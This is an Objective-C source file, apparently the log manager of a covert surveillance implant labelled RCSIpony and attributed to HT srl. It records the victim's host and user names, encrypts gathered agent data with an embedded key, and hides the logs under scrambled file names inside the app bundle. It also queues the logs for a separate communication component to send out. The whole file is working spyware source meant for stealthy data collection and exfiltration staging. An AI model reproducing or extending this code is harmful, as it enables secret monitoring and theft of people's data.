/*
 * RCSIpony - Log Manager
 *  Logging facilities, this class is a singleton which will be referenced
 *  by RCSMCommunicationManager and all the single agents providing ways for
 *  writing log data per agentID or agentLogFileHandle.
 *
 *
 *  - Provide all the instance methods in order to access and remove items from
 *    the queues without the needs for external objects to access the queue
 *    directly, aka Keep It Pr1v4t3!
 *
 * Created by Alfredo 'revenge' Pesoli on 16/06/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import "RCSILogManager.h"
#import "RCSIEncryption.h"

#import <CommonCrypto/CommonDigest.h>

//#define DEBUG

static NSLock *gSendQueueLock;
static NSLock *gActiveQueueLock;

static RCSILogManager *sharedLogManager = nil;

#pragma mark -
#pragma mark Log File Header Struct Definition
#pragma mark -

//
// First DWORD is not encrypted and specifies: sizeof(logStruct) + deviceIdLen + 
// userIdLen + sourceIdLen + uAdditionalData
//
typedef struct _log {
  u_int version;
#define LOG_VERSION   2008121901
  u_int type;
  u_int hiTimestamp;
  u_int loTimestamp;
  u_int deviceIdLength;       // IMEI/Hostname len
  u_int userIdLength;         // IMSI/Username len
  u_int sourceIdLength;       // Caller Number / IP length
  u_int additionalDataLength; // Size of additional data if present
} logStruct;


@interface RCSILogManager (hidden)

- (BOOL)_addLogToQueue: (u_int)agentID queue: (int)queueType;
- (BOOL)_removeLogFromQueue: (u_int)agentID queue: (int)queueType;
- (NSData *)_createLogHeader: (u_int)agentID
                   timestamp: (int64_t)fileTime
                 agentHeader: (NSData *)anAgentHeader;
//- (int)_getLastLogSequenceNumber;

@end

@implementation RCSILogManager (hidden)

- (BOOL)_addLogToQueue: (u_int)agentID queue: (int)queueType
{
  return TRUE;
}

- (BOOL)_removeLogFromQueue: (u_int)agentID queue: (int)queueType
{
  return TRUE;
}

- (NSData *)_createLogHeader: (u_int)agentID
                   timestamp: (int64_t)fileTime
                 agentHeader: (NSData *)anAgentHeader
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  //NSString *hostName = [[NSHost currentHost] name];
  char tempHost[100];
  NSString *hostName;
  if (gethostname(tempHost, 100) == 0)
    hostName = [NSString stringWithCString: tempHost
                                  encoding: NSUTF8StringEncoding];
  else
    hostName = @"EMPTY";
  
  NSString *userName = NSUserName();
  
  logStruct *logRawHeader;
  NSMutableData *logHeader = [[NSMutableData dataWithLength: sizeof(logStruct)] retain];
  
#ifdef DEBUG
  NSLog(@"logStruct: %d", sizeof(logStruct));
#endif
  logRawHeader = (logStruct *)[logHeader bytes];
  
  logRawHeader->version = LOG_VERSION;
  logRawHeader->type = agentID;
  logRawHeader->hiTimestamp = (int64_t)fileTime >> 32;
  logRawHeader->loTimestamp = (int64_t)fileTime & 0xFFFFFFFF;
  logRawHeader->deviceIdLength = [hostName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  logRawHeader->userIdLength = [userName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  logRawHeader->sourceIdLength = 0;
  
  if (anAgentHeader != nil && anAgentHeader != 0)
    logRawHeader->additionalDataLength = [anAgentHeader length];
  else
    logRawHeader->additionalDataLength = 0;

#ifdef DEBUG
  NSLog(@"hiTimestamp: %x", logRawHeader->hiTimestamp);
  NSLog(@"loTimestamp: %x", logRawHeader->loTimestamp);
  NSLog(@"logHeader: %@", logHeader);
#endif
  
  int headerLength = sizeof(logStruct) + 
                     logRawHeader->deviceIdLength +
                     logRawHeader->userIdLength +
                     logRawHeader->sourceIdLength +
                     logRawHeader->additionalDataLength;
  
  int paddedLength = headerLength;
#ifdef DEBUG
  NSLog(@"unpaddedLength: %d", paddedLength);
#endif
  if (paddedLength % kCCBlockSizeAES128)
    {
      int pad = (paddedLength + kCCBlockSizeAES128 & ~(kCCBlockSizeAES128 - 1)) - paddedLength;
      paddedLength += pad;
      /*
      paddedLength >> 4;
      paddedLength++;
      paddedLength << 4;
       */
    }
#ifdef DEBUG
  NSLog(@"paddedLength: %d", paddedLength);
#endif
  paddedLength += sizeof(int);
  
  if (paddedLength < headerLength)
    {
      [logHeader release];
      
      return nil;
    }
  
  NSMutableData *rawHeader = [NSMutableData dataWithCapacity: [logHeader length]
                              + [hostName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]
                              + [userName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]
                              + [anAgentHeader length]];
  
  //
  // Clear dword at the start of the file which specifies the size of the
  // unencrypted data
  //
  headerLength = paddedLength - sizeof(int);

#ifdef DEBUG
  NSLog(@"headerLength: %d", headerLength);
#endif

  [rawHeader appendData: logHeader];
  [rawHeader appendData: [hostName dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  [rawHeader appendData: [userName dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];

#ifdef DEBUG
  NSLog(@"logHeader: %@", logHeader);
  NSLog(@"hostName: %@", hostName);
  NSLog(@"userName: %@", userName);
  NSLog(@"rawHeader: %@", rawHeader);
  NSLog(@"anAgentHeader: %@", anAgentHeader);
#endif

  if (anAgentHeader != nil)
    [rawHeader appendData: anAgentHeader];

#ifdef DEV_MODE
  unsigned char tmp[CC_MD5_DIGEST_LENGTH];
  CC_MD5(gLogAesKey, strlen(gLogAesKey), tmp);
  
  NSData *temp = [NSData dataWithBytes: tmp
                                length: CC_MD5_DIGEST_LENGTH];
#else
  NSData *temp = [NSData dataWithBytes: gLogAesKey
                                length: CC_MD5_DIGEST_LENGTH];
#endif
  
#ifdef DEBUG  
  NSLog(@"rawHeader Size before Encryption: %d", [rawHeader length]);
#endif
  CCCryptorStatus result = 0;
  
  result = [rawHeader encryptWithKey: temp];
  [logHeader release];
  
  if (result == kCCSuccess)
    {
      NSMutableData *header = [NSMutableData dataWithCapacity: headerLength + sizeof(int)];
      [header appendBytes: &headerLength length: sizeof(headerLength)];
      [header appendData: rawHeader];
      
#ifdef DEBUG      
      NSLog(@"rawHeader Size after Encryption: %d", [rawHeader length]);
      NSLog(@"headerLength: %x", headerLength);
#endif DEBUG
  
      [header retain];
      [outerPool release];
      
      return header;
    }
  else
    {
#ifdef DEBUG
      NSLog(@"error on encryption: %d", result);
#endif
    }
  
  [outerPool release];
  
  return nil;
}

@end


@implementation RCSILogManager

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (RCSILogManager *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedLogManager == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedLogManager;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedLogManager == nil)
      {
        sharedLogManager = [super allocWithZone: aZone];
        
        //
        // Assignment and return on first allocation
        //
        return sharedLogManager;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)init
{
  Class myClass = [self class];
  
  @synchronized(myClass)
    {
      if (sharedLogManager != nil)
        {
          self = [super init];
          
          if (self != nil)
            {
              mActiveQueue = [[NSMutableArray alloc] init];
              mSendQueue = [[NSMutableArray alloc] init];
              mTempQueue = [[NSMutableArray alloc] init];
              
              // Temp Code
#ifdef DEV_MODE
              unsigned char result[CC_MD5_DIGEST_LENGTH];
              CC_MD5(gLogAesKey, strlen(gLogAesKey), result);
              
              NSData *temp = [NSData dataWithBytes: result
                                            length: CC_MD5_DIGEST_LENGTH];
#else
              NSData *temp = [NSData dataWithBytes: gLogAesKey
                                            length: CC_MD5_DIGEST_LENGTH];
#endif
              
              mEncryption = [[RCSIEncryption alloc] initWithKey: temp];

              gSendQueueLock   = [[NSLock alloc] init];
              gActiveQueueLock = [[NSLock alloc] init];
            }
          
          sharedLogManager = self;
        }
    }
  
  return sharedLogManager;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark Logging facilities
#pragma mark -

- (BOOL)createLog: (u_int)agentID
      agentHeader: (NSData *)anAgentHeader
        withLogID: (u_int)logID
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  BOOL success;
  NSError *error;
  
  int64_t filetime;
  NSString *encryptedLogName;
  usleep(50000);
  
  do
    {
      time_t unixTime;
      time(&unixTime);
#ifdef DEBUG
      NSLog(@"unixTime: %x", unixTime);
#endif
      filetime = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
#ifdef DEBUG
      NSLog(@"TIME: %x", (int64_t)filetime);
#endif
      int32_t hiPart = (int64_t)filetime >> 32;
      int32_t loPart = (int64_t)filetime & 0xFFFFFFFF;
      
#ifdef DEBUG
      NSLog(@"hiPart: %x", hiPart);
      NSLog(@"loPart: %x", loPart);
#endif
      NSString *logName = [[NSString alloc] initWithFormat: @"LOGF_%.4X_%.8X%.8X.log",
                                                            agentID,
                                                            hiPart,
                                                            loPart];
#ifdef DEBUG
      NSLog(@"LogName: %@", logName);
#endif
      
      encryptedLogName = [NSString stringWithFormat: @"%@/%@",
                          [[NSBundle mainBundle] bundlePath],
                          [mEncryption scrambleForward: logName
                                                  seed: gLogAesKey[0]]];
    
      [logName release];
    }
  while ([[NSFileManager defaultManager] fileExistsAtPath: encryptedLogName] == TRUE);

#ifdef DEBUG
  NSLog(@"Creating log clear %@ enc %@", logName, encryptedLogName);
  NSLog(@"anAgentHeader: %@", anAgentHeader);
#endif
  
  success = [@"" writeToFile: encryptedLogName
                  atomically: NO
                    encoding: NSUnicodeStringEncoding
                       error: &error];
  
  if (success == YES)
    {
      NSFileHandle *logFileHandle = [NSFileHandle fileHandleForUpdatingAtPath:
                                     encryptedLogName];
      if (logFileHandle) 
        {
#ifdef DEBUG
          NSLog(@"LogHandle acquired");
#endif

          NSNumber *agent   = [[NSNumber alloc] initWithUnsignedInt: agentID];
          NSNumber *_logID  = [[NSNumber alloc] initWithUnsignedInt: logID];
          
          NSArray *keys     = [NSArray arrayWithObjects: @"agentID",
                                                         @"logID",
                                                         @"logName",
                                                         @"handle",
                                                         @"header",
                                                         nil];
          NSArray *objects;
          
          if (anAgentHeader == nil)
            {
              objects  = [NSArray arrayWithObjects: agent,
                                                    _logID,
                                                    encryptedLogName,
                                                    logFileHandle,
                                                    @"NO",
                                                    nil];
            }
          else
            {
              objects  = [NSArray arrayWithObjects: agent,
                                                    _logID,
                                                    encryptedLogName,
                                                    logFileHandle,
                                                    anAgentHeader,
                                                    nil];
            }
          
          NSMutableDictionary *agentLog = [[NSMutableDictionary alloc] init];
          NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                                 forKeys: keys];
          [agentLog addEntriesFromDictionary: dictionary];
          
          [gActiveQueueLock lock];
          [mActiveQueue addObject: agentLog];
          [gActiveQueueLock unlock];
          
          [agent release];
          [_logID release];
          
#ifdef DEBUG
          NSLog(@"activeQueue from Create: %@", mActiveQueue);
#endif
          
          //
          // logHeader contains the whole encrypted header
          // first dword is in clear text (padded size)
          //
          NSData *logHeader = [self _createLogHeader: agentID
                                           timestamp: filetime
                                         agentHeader: anAgentHeader];
          
          if (logHeader == nil)
            {
#ifdef DEBUG
              NSLog(@"An error occurred while creating log Header");
#endif   
              [agentLog release];
              [outerPool release];
              
              return FALSE;
            }
#ifdef DEBUG
          NSLog(@"encrypted Header: %@", logHeader);
#endif
          if ([self writeDataToLog: logHeader
                         forHandle: logFileHandle] == FALSE)
            return FALSE;

          [agentLog release];
          [outerPool release];
          
          return TRUE;
        }
    }

#ifdef DEBUG
  NSLog(@"An error occurred while creating the log file");
#endif
  
  [outerPool release];
  
  return FALSE;
}

- (BOOL)closeActiveLogs: (BOOL)continueLogging
{
  [gActiveQueueLock lock];
  NSEnumerator *enumerator = [[[mActiveQueue copy] autorelease] objectEnumerator];
  [gActiveQueueLock unlock];
  
  NSMutableArray *tempArray = [[NSMutableArray alloc] init];
  id anObject;
  
  while (anObject = [enumerator nextObject])
    {
      [[anObject objectForKey: @"handle"] closeFile];
      
      //
      // Now put the log in the sendQueue and remove it from the active queue
      //
#ifdef DEBUG
      NSLog(@"mSendQueue: %@", mSendQueue);
      NSLog(@"mActiveQueue: %@", mActiveQueue);
#endif
      [gActiveQueueLock lock];
      [gSendQueueLock lock];
      
      [mSendQueue addObject: anObject];
      [mActiveQueue removeObject: anObject];
      
      [gSendQueueLock unlock];
      [gActiveQueueLock unlock];
      
      //
      // Verifying if we need to recreate the log entry so that the agents can
      // keep logging (verify for possible races here)
      //
      if (continueLogging == TRUE)
        {
          NSNumber *tempAgentID = [NSNumber numberWithInt:
                                   [[anObject objectForKey: @"agentID"] intValue]];

          id tempAgentHeader = [anObject objectForKey: @"header"];

          NSArray *keys = [NSArray arrayWithObjects: @"agentID",
                                                     @"header",
                                                     nil];
          NSArray *objects = [NSArray arrayWithObjects: tempAgentID,
                                                        tempAgentHeader,
                                                        nil];
          
          NSMutableDictionary *agent = [[NSMutableDictionary alloc] init];
          NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                                 forKeys: keys];
          
          [agent addEntriesFromDictionary: dictionary];
          [tempArray addObject: agent];
          [agent release];
        }
    }
  
  if (continueLogging == TRUE)
    {
#ifdef DEBUG
      NSLog(@"Recreating agents log");
#endif
      for (id agent in tempArray)
        {
          id agentHeader = [agent objectForKey: @"header"];
          
          if ([agentHeader isKindOfClass: [NSString class]])
            {
              if ([agentHeader isEqualToString: @"NO"])
                {
#ifdef DEBUG
                  NSLog(@"No Agent Header found");
#endif
                  
                  [self createLog: [[agent objectForKey: @"agentID"] intValue]
                      agentHeader: nil
                        withLogID: [[agent objectForKey: @"logID"] intValue]];
                }
              else
                {
                  [self createLog: [[agent objectForKey: @"agentID"] intValue]
                      agentHeader: [NSData dataWithData: [agent objectForKey: @"header"]]
                        withLogID: [[agent objectForKey: @"logID"] intValue]];
                }
            }
        }
    }
  
#ifdef DEBUG
  NSLog(@"Logs recreated correctly");
#endif
  
  return TRUE;
}

- (BOOL)closeActiveLogsAndContinueLogging: (BOOL)continueLogging
{
  NSMutableIndexSet *discardedItem  = [NSMutableIndexSet indexSet];
  NSMutableArray *newItems          = [[NSMutableArray alloc] init];
  NSMutableArray *tempAgentsConf    = [[NSMutableArray alloc] init];
  NSUInteger index                  = 0;
  
  id item;
  
  for (item in mActiveQueue)
    {
    [[item objectForKey: @"handle"] closeFile];
    [newItems addObject: item];
    [discardedItem addIndex: index];
    
    //
    // Verifying if we need to recreate the log entry so that the agents can
    // keep logging (verify for possible races here)
    //
    if (continueLogging == TRUE)
      {
      NSNumber *tempAgentID = [NSNumber numberWithInt:
                               [[item objectForKey: @"agentID"] intValue]];
      
      id tempAgentHeader = [item objectForKey: @"header"];
      
      NSArray *keys = [NSArray arrayWithObjects: @"agentID",
                       @"header",
                       nil];
      NSArray *objects = [NSArray arrayWithObjects: tempAgentID,
                          tempAgentHeader,
                          nil];
      
      NSMutableDictionary *agent = [[NSMutableDictionary alloc] init];
      NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                             forKeys: keys];
      
      [agent addEntriesFromDictionary: dictionary];
      [tempAgentsConf addObject: agent];
      [agent release];
      }
    
    index++;
    }
  
  [gActiveQueueLock lock];
  [gSendQueueLock lock];
  
  [mActiveQueue removeObjectsAtIndexes: discardedItem];
  [mSendQueue addObjectsFromArray: newItems];
  
  [gSendQueueLock unlock];
  [gActiveQueueLock unlock];
  
  if (continueLogging == TRUE)
    {
#ifdef DEBUG_LOG_MANAGER
    infoLog(@"Recreating agents log");
#endif
    for (id agent in tempAgentsConf)
      {
      id agentHeader = [agent objectForKey: @"header"];
      
      if ([agentHeader isKindOfClass: [NSString class]])
        {
        if ([agentHeader isEqualToString: @"NO"])
          {
#ifdef DEBUG_LOG_MANAGER
          infoLog(@"No Agent Header found");
#endif
          [self createLog: [[agent objectForKey: @"agentID"] intValue]
              agentHeader: nil
                withLogID: [[agent objectForKey: @"logID"] intValue]];
          }
        }
      else if ([agentHeader isKindOfClass: [NSData class]])
        {
#ifdef DEBUG_LOG_MANAGER
        infoLog(@"agentHeader (%@)", [agentHeader class]);
        infoLog(@"agentHeader = %@", agentHeader);
#endif
        
        NSData *_agentHeader = [[NSData alloc] initWithData: [agent objectForKey: @"header"]];
        
        [self createLog: [[agent objectForKey: @"agentID"] intValue]
            agentHeader: _agentHeader
              withLogID: [[agent objectForKey: @"logID"] intValue]];
        
        [_agentHeader release];
        }
      }
    }
  
#ifdef DEBUG_LOG_MANAGER
  infoLog(@"Logs recreated correctly");
#endif
  
  [newItems release];
  [tempAgentsConf release];
  
  return TRUE;
}

- (BOOL)closeActiveLog: (u_int)agentID
             withLogID: (u_int)logID
{
  [gActiveQueueLock lock];
  NSEnumerator *enumerator = [[[mActiveQueue copy] autorelease] objectEnumerator];
  [gActiveQueueLock unlock];
  
  id anObject;
  
  while (anObject = [enumerator nextObject])
    {
      if ([[anObject objectForKey: @"agentID"] unsignedIntValue] == agentID &&
          ([[anObject objectForKey: @"logID"] unsignedIntValue] == logID || logID == 0))
        {
#ifdef DEBUG
          NSLog(@"%s: Closing Log for agentID 0x%x with logID 0x%x", __FUNCTION__, agentID, logID);
#endif
          [[anObject objectForKey: @"handle"] closeFile];
          
          //
          // Now put the log in the sendQueue and remove it from the active queue
          //
#ifdef DEBUG
          NSLog(@"%s: mSendQueue: %@", __FUNCTION__, mSendQueue);
          NSLog(@"%s: mActiveQueue: %@", __FUNCTION__, mActiveQueue);
#endif
          
          [gActiveQueueLock lock];
          [gSendQueueLock lock];
          
          [mSendQueue addObject: anObject];
          [mActiveQueue removeObject: anObject];
          
          [gSendQueueLock unlock];
          [gActiveQueueLock unlock];
          
#ifdef DEBUG
          NSLog(@"%s: mSendQueue: %@", __FUNCTION__, mSendQueue);
          NSLog(@"%s: mActiveQueue: %@", __FUNCTION__, mActiveQueue);
#endif

          return TRUE;
        }
      }
  
  usleep(10000);
  
  return FALSE;
}

- (BOOL)writeDataToLog: (NSData *)aData forHandle: (NSFileHandle *)anHandle
{
  @try
    {
      [anHandle writeData: aData];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG
      NSLog(@"%s exception", __FUNCTION__);
#endif
      
      return FALSE;
    }
    
  return TRUE;
}

- (BOOL)writeDataToLog: (NSMutableData *)aData 
              forAgent: (u_int)agentID
             withLogID: (u_int)logID
{
  BOOL logFound = FALSE;

#ifdef DEBUG
  NSLog(@"%s: Saving data for agent: %04x and logID 0x%x", __FUNCTION__, agentID, logID);
#endif
  
  [gActiveQueueLock lock];
  NSEnumerator *enumerator = [mActiveQueue objectEnumerator];
  [gActiveQueueLock unlock];
  
  id anObject;
  
  while (anObject = [enumerator nextObject])
    {
      if ([[anObject objectForKey: @"agentID"] unsignedIntValue] == agentID
          && ([[anObject objectForKey:@"logID"] unsignedIntValue] == logID || logID == 0))
        {
          logFound = TRUE;
          
          NSFileHandle *logHandle = [anObject objectForKey: @"handle"];
      
#ifdef DEV_MODE
          unsigned char tmp[CC_MD5_DIGEST_LENGTH];
          CC_MD5(gLogAesKey, strlen(gLogAesKey), tmp);
          
          NSData *temp = [NSData dataWithBytes: tmp
                                        length: CC_MD5_DIGEST_LENGTH];
#else
          NSData *temp = [NSData dataWithBytes: gLogAesKey
                                      length: CC_MD5_DIGEST_LENGTH];
#endif

          int _blockSize = [aData length];
          CCCryptorStatus result = 0;
          result = [aData encryptWithKey: temp];
          
          if (result == kCCSuccess)
            {
#ifdef DEBUG
              NSLog(@"%s: logData Encrypted correctly", __FUNCTION__);
#endif
        
              NSData *blockSize = [NSData dataWithBytes: (void *)&_blockSize
                                                 length: sizeof(int)];
              
              // Writing the size of the clear text block
              [logHandle writeData: blockSize];
              // then our log data
              [logHandle writeData: aData];
              
              break;
            }
          else
            {
#ifdef DEBUG
              NSLog(@"%s: An error occurred while encrypting log data", __FUNCTION__);
#endif
            }
        }
    }
  
  //
  // If logFound is false and we called this function, it means that the agent
  // is running but no file was recreated, thus we need to do it here
  //
  if (logFound == FALSE)
    {
#ifdef DEBUG_TMP
      NSLog(@"%s: Log not found",__FUNCTION__);
#endif
      
      return FALSE;
    }
  
  return TRUE;
}

- (BOOL)removeSendLog: (u_int)agentID
            withLogID: (u_int)logID
{
#ifdef DEBUG
  NSLog(@"Removing Log Entry from the Send queue");
#endif
  [gSendQueueLock lock];
  
  NSMutableIndexSet *discardedItem = [NSMutableIndexSet indexSet];
  NSUInteger index = 0;
  
  id item;
  
  for (item in mSendQueue)
    {
      if ([[item objectForKey: @"agentID"] unsignedIntValue] == agentID
          && ([[item objectForKey: @"logID"] unsignedIntValue] == logID || logID == 0))
        {
          [discardedItem addIndex: index];
        }
      
      index++;
    }
  
  [mSendQueue removeObjectsAtIndexes: discardedItem];
  [gSendQueueLock unlock];
  
  return TRUE;
}

#pragma mark -
#pragma mark Accessors
#pragma mark -

- (NSMutableArray *)mActiveQueue
{
  return mActiveQueue;
}

- (NSEnumerator *)getActiveQueueEnumerator
{
  NSEnumerator *enumerator;
  
  [gActiveQueueLock lock];
  
  if ([mActiveQueue count] > 0)
    enumerator = [[[mActiveQueue copy] autorelease] objectEnumerator];
  else
    enumerator = nil;
  
  [gActiveQueueLock unlock];
  
  return enumerator;
}

- (NSEnumerator *)getSendQueueEnumerator
{
  NSEnumerator *enumerator;
  
  [gSendQueueLock lock];
  
  if ([mSendQueue count] > 0)
    enumerator = [[[mSendQueue copy] autorelease] objectEnumerator];
  else
    enumerator = nil;
  
  [gSendQueueLock unlock];
  
  return enumerator;
}

@end
